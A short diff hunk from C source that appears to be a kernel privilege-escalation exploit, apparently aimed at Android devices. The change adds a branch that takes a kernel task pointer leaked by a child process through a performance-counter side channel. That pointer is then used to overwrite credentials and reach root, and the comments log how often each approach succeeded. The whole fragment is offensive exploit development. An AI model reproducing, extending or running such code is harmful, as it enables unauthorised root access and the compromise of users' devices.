@@ -2296,7 +2296,16 @@ uid0_cred_punch:;
    * (ffffff87/88/89) self-punches missed 3/3 today (CapEff stayed 0);
    * the child punch hit (overnight 26225: child_status=0). Self only if
    * P0; else child raw (high alias is fine for the child). */
-  if (env_flag("UID0_PREFER_CHILD", 0) && !env_flag("UID0_SELF_ONLY", 0) &&
+  if (task_ptr_ok(child_self) && !env_flag("UID0_SELF_ONLY", 0)) {
+    /* CHILD SELF-LEAK (piped from the child — JoinChang architecture):
+     * the child ran the proven pid=0 user-PMU leak itself. Prefer it over
+     * both parent-side leaks (those failed 0/0 on recent boots). */
+    use_task = child_self;
+    ucnt = 256;
+    who = p0_dram_ptr(child_self) ? "child_piped_p0" : "child_piped";
+    pr_info("UID0 using PIPED child task=%016zx (self-leak)\n",
+            (unsigned long long)child_self);
+  } else if (env_flag("UID0_PREFER_CHILD", 0) && !env_flag("UID0_SELF_ONLY", 0) &&
       task_ptr_ok(lch.x28) &&
       lch.x28_cnt >= 4) {
     /* Z33: parent stays 2000 so ROOTGUARD does not SIGKILL pselect.
